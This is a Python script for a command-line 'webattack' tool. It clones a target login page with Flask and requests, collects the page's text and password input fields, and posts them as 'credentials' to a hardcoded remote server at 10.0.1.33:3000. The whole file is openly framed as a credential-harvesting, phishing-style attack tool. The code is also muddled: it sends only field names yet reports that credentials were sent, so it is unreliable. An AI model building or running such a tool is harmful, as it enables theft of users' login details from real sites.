import os
import requests
import argparse
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify
import threading
import time

# Flask Setup for Hosting Server
app = Flask(__name__)

# Store cloned data for use later
cloned_page = None
credentials = []

# Remote server address where we will send the credentials
REMOTE_SERVER = "http://10.0.1.33:3000"

@app.route('/clone', methods=['POST'])
def clone():
    global cloned_page, credentials
    target_url = request.form.get('target_url', None)
    
    # Debugging the request
    print(f"Received target URL: {target_url}")
    
    if not target_url:
        return jsonify({"status": "error", "message": "No target URL provided."}), 400
    
    try:
        # Request the page content
        response = requests.get(target_url)
        if response.status_code == 200:
            cloned_page = response.text  # Store the cloned HTML page
            
            # Parse the page with BeautifulSoup
            soup = BeautifulSoup(cloned_page, 'html.parser')
            
            # Find all input fields (credentials)
            credentials = []
            for input_tag in soup.find_all('input'):
                if input_tag.get('name') and input_tag.get('type') in ['text', 'password']:
                    credentials.append(input_tag.get('name'))
            
            # Send credentials to remote server
            send_credentials(credentials)
            return jsonify({"status": "success", "message": f"Cloned {target_url} and sent credentials."}), 200
        else:
            return jsonify({"status": "error", "message": "Failed to retrieve the target page."}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def send_credentials(credentials):
    """Send the credentials to the remote server."""
    try:
        payload = {'credentials': credentials}
        response = requests.post(REMOTE_SERVER, data=payload)
        if response.status_code == 200:
            print("Credentials sent successfully!")
        else:
            print(f"Failed to send credentials: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error in sending credentials: {e}")

def run_flask():
    """Run Flask application in a separate thread."""
    app.run(debug=False, host="0.0.0.0", port=5000, threaded=True)

def execute_command(command):
    """Simulate command-line interface for webattack tool."""
    if command.startswith("clone"):
        target_url = command.split(" ")[1]
        print(f"Cloning {target_url}...")
        
        # Start Flask server in a separate thread
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        
        # Wait for Flask server to be ready before sending request
        time.sleep(2)  # Wait 2 seconds to ensure Flask server is up
        
        # Send POST request to clone the site
        clone_url = f'http://127.0.0.1:5000/clone'
        payload = {'target_url': target_url}
        print(f"Sending request to: {clone_url} with payload: {payload}")  # Debugging output
        response = requests.post(clone_url, data=payload)
        
        if response.status_code == 200:
            print(f"Successfully cloned and sent credentials from {target_url}")
        else:
            print(f"Failed to clone the target site. Status Code: {response.status_code}")
    else:
        print(f"Unknown command: {command}")

def main():
    """Main method for the command-line tool."""
    while True:
        try:
            # Simulate the command prompt interface
            command = input("webattack > ")
            
            if command == "exit":
                print("Exiting webattack tool.")
                break
            
            # Execute the given command
            execute_command(command)

        except KeyboardInterrupt:
            # Handle Ctrl+C gracefully
            print("\nCtrl+C detected, continuing to run the Flask server in the background.")

if __name__ == '__main__':
    main()
